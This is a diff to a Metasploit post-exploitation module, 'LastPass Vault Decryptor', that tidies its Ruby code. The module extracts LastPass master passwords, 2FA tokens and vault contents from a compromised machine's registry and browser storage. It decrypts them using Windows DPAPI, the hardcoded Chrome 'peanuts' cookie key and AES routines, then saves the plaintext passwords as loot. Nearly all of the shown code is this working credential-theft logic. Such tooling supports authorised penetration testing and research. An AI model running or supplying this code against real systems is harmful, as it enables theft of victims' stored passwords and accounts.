@@ -1,5 +1,9 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 require 'msf/core'
-require 'base64'
 require 'sqlite3'
 require 'uri'
 require 'rex'
@@ -11,22 +15,26 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Unix
 
   def initialize(info = {})
-    super(
-      update_info(
-        info,
-        'Name' => 'LastPass Vault Decryptor',
-        'Description' => 'This module extracts and decrypts LastPass master login accounts and passwords, encryption keys, 2FA tokens and all the vault passwords',
-        'License' => MSF_LICENSE,
-        'Author' => [
+    super(update_info(info,
+      'Name' => 'LastPass Vault Decryptor',
+      'Description' => %q{
+        This module extracts and decrypts LastPass master login accounts and passwords,
+        encryption keys, 2FA tokens and all the vault passwords
+      },
+      'License' => MSF_LICENSE,
+      'Author' =>
+        [
           'Alberto Garcia Illera <agarciaillera[at]gmail.com>', # original module and research
           'Martin Vigo <martinvigo[at]gmail.com>', # original module and research
-          'Jon Hart <jon_hart[at]rapid7.com' # module rework and cleanup
+          'Jon Hart' # module rework and cleanup
         ],
-        'Platform' => %w(linux osx unix win),
-        'References'   => [['URL', 'http://www.martinvigo.com/even-the-lastpass-will-be-stolen-deal-with-it']],
-        'SessionTypes' => %w(meterpreter shell)
-      )
-    )
+      'Platform'     => %w(linux osx unix win),
+      'References'   =>
+        [
+          [ 'URL', 'http://www.martinvigo.com/even-the-lastpass-will-be-stolen-deal-with-it' ]
+        ],
+      'SessionTypes' => %w(meterpreter shell)
+    ))
   end
 
   def run
@@ -241,7 +249,7 @@ class Metasploit3 < Msf::Post
 
       # Extract master passwords
       data = read_registry_key_value('HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass', "LoginPws")
-      data = Base64.encode64(data) unless data.blank?
+      data = Rex::Text.encode_base64(data) unless data.blank?
     else # Firefox
       loot_path = loot_file(prefs_path, nil, 'firefox.preferences', "text/javascript", "Firefox preferences file")
       return [] unless loot_path
@@ -278,7 +286,7 @@ class Metasploit3 < Msf::Post
 
     if encrypted_data.include?("|") # Use CBC
       decipher = OpenSSL::Cipher.new("AES-256-CBC")
-      decipher.iv = Base64.decode64(encrypted_data[1, 24]) # Discard ! and |
+      decipher.iv = Rex::Text.decode_base64(encrypted_data[1, 24]) # Discard ! and |
       encrypted_data = encrypted_data[26..-1] # Take only the data part
     else # Use ECB
       decipher = OpenSSL::Cipher.new("AES-256-ECB")
@@ -287,9 +295,9 @@ class Metasploit3 < Msf::Post
     begin
       decipher.decrypt
       decipher.key = key
-      decrypted_data = decipher.update(Base64.decode64(encrypted_data)) + decipher.final
-    rescue
-      vprint_error "Data could not be decrypted"
+      decrypted_data = decipher.update(Rex::Text.decode_base64(encrypted_data)) + decipher.final
+    rescue OpenSSL::Cipher::CipherError => e
+      vprint_error "Data could not be decrypted. #{e.message}"
     end
 
     decrypted_data
@@ -396,7 +404,7 @@ class Metasploit3 < Msf::Post
           if browser.match(/Firefox|IE/)
             if browser == "Firefox"
               iterations_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key.itr"
-              vault_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.act.sxml"
+              vault_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.sxml"
             else # IE
               iterations_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key_ie.itr"
               vault_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.sxml"
@@ -461,12 +469,12 @@ class Metasploit3 < Msf::Post
   end
 
   # Decrypt the locally stored vault key
-  def decrypt_local_vault_key account, browser_map
+  def decrypt_local_vault_key(account, browser_map)
     data = nil
     session_cookie_value = nil
 
     browser_map.each_pair do |browser, lp_data|
-      if browser == "IE"
+      if browser == "IE" && directory?(lp_data['cookies_db'])
         cookies_files = dir(lp_data['cookies_db'])
         cookies_files.reject! { |u| %w(. ..).include?(u) }
         cookies_files.each do |cookie_jar_file|
@@ -496,8 +504,8 @@ class Metasploit3 < Msf::Post
         db = SQLite3::Database.new(loot_path)
         begin
           result = db.execute(query)
-        rescue
-          vprint_error "No session cookie was found in #{account}'s #{browser}"
+        rescue SQLite3::SQLException => e
+          vprint_error "No session cookie was found in #{account}'s #{browser} (#{e.message})"
           next
         end
         next if result.blank? # No session cookie found for this browser
@@ -506,18 +514,18 @@ class Metasploit3 < Msf::Post
       return if session_cookie_value.blank?
 
       # Check if cookie value needs to be decrypted
-      if Base64.encode64(session_cookie_value).match(/^AQAAA.+/) # Windows Data protection API
-        session_cookie_value = windows_unprotect(Base64.encode64(session_cookie_value))
+      if Rex::Text.encode_base64(session_cookie_value).match(/^AQAAA.+/) # Windows Data protection API
+        session_cookie_value = windows_unprotect(Rex::Text.encode_base64(session_cookie_value))
       elsif session_cookie_value.match(/^v10/) && browser.match(/Chrome|Opera/) # Chrome/Opera encrypted cookie in Linux
-        decipher = OpenSSL::Cipher.new("AES-256-CBC")
-        decipher.decrypt
-        decipher.key = OpenSSL::Digest::SHA256.hexdigest("peanuts")
-        decipher.iv = " " * 16
-        session_cookie_value = session_cookie_value[3..-1] # Discard v10
         begin
+          decipher = OpenSSL::Cipher.new("AES-256-CBC")
+          decipher.decrypt
+          decipher.key = OpenSSL::Digest::SHA256.hexdigest("peanuts")
+          decipher.iv = " " * 16
+          session_cookie_value = session_cookie_value[3..-1] # Discard v10
           session_cookie_value = decipher.update(session_cookie_value) + decipher.final
-        rescue
-          print_error "Cookie could not be decrypted"
+        rescue OpenSSL::Cipher::CipherError => e
+          print_error "Cookie could not be decrypted. #{e.message}"
         end
       end
 
@@ -625,7 +633,7 @@ class Metasploit3 < Msf::Post
   end
 
   def windows_unprotect(data)
-    data = Base64.decode64(data)
+    data = Rex::Text.decode_base64(data)
     rg = session.railgun
     pid = session.sys.process.getpid
     process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
@@ -675,7 +683,7 @@ class Metasploit3 < Msf::Post
           end
 
           # Parse vault
-          vault = Base64.decode64(encoded_vault)
+          vault = Rex::Text.decode_base64(encoded_vault)
           vault.scan(/ACCT/) do |result|
             chunk_length = vault[$~.offset(0)[1]..$~.offset(0)[1] + 3].unpack("H*").first.to_i(16) # Get the length in base 10 of the ACCT chunk
             chunk = vault[$~.offset(0)[0]..$~.offset(0)[1] + chunk_length] # Get ACCT chunk
@@ -684,7 +692,11 @@ class Metasploit3 < Msf::Post
           end
 
           unless account_map.empty? # Loot passwords
-            print_good lastpass_vault_data_table.to_s
+            if lastpass_vault_data_table.rows.empty?
+              print_status('No decrypted vaults.')
+            else
+              print_good lastpass_vault_data_table.to_s
+            end
             loot_file(nil, lastpass_vault_data_table.to_csv, "#{browser.downcase}.lastpass.passwords", "text/csv", "LastPass Vault Passwords from #{username}")
           end
         end
@@ -697,18 +709,23 @@ class Metasploit3 < Msf::Post
     labels = ["name", "folder", "url", "notes", "undefined", "undefined2", "username", "password"]
     vault_data = []
     for label in labels
-      begin
-        length = chunk[pointer..pointer + 3].unpack("H*").first.to_i(16)
-        encrypted_data = chunk[pointer + 4..pointer + 4 + length - 1]
-        label != "url" ? decrypted_data = decrypt_vault_password(vault_key, encrypted_data) : decrypted_data = [encrypted_data].pack("H*")
-        decrypted_data = "" if decrypted_data.nil?
-        vault_data << decrypted_data if (label == "url" || label == "username" || label == "password")
-        pointer = pointer + 4 + length
-      rescue
-        vprint_error "Vault account could not be parsed"
+      #if chunk[pointer..pointer + 3].nil?
+      #  vprint_error "Vault account could not be parsed"
+      #  return nil
+      #end
+      length = chunk[pointer..pointer + 3].unpack("H*").first.to_i(16)
+      encrypted_data = chunk[pointer + 4..pointer + 4 + length - 1]
+      label != "url" ? decrypted_data = decrypt_vault_password(vault_key, encrypted_data) : decrypted_data = [encrypted_data].pack("H*")
+      decrypted_data = "" if decrypted_data.nil?
+      vault_data << decrypted_data if (label == "url" || label == "username" || label == "password")
+      pointer = pointer + 4 + length
+
+      if chunk[pointer..pointer + 3].nil?
+        # Out of bound read
         return nil
       end
     end
+
     return vault_data[0] == "http://sn" ? nil : vault_data # TODO: Support secure notes
   end
 
@@ -727,8 +744,8 @@ class Metasploit3 < Msf::Post
 
     begin
       return decipher.update(encrypted_data) + decipher.final
-    rescue
-      vprint_error "Vault password could not be decrypted"
+    rescue OpenSSL::Cipher::CipherError
+      vprint_error "Vault password could not be decrypted with key #{key}"
       return nil
     end
   end
@@ -768,8 +785,8 @@ class Metasploit3 < Msf::Post
       return nil unless reg_key
       reg_value = reg_key.query_value(value)
       return nil unless reg_value
-    rescue
-      vprint_error "Error reading registry key #{key} and value #{value}"
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error("#{e.message} (#{key}\\#{value})")
     end
     reg_key.close if reg_key
     return reg_value.blank? ? nil : reg_value.data
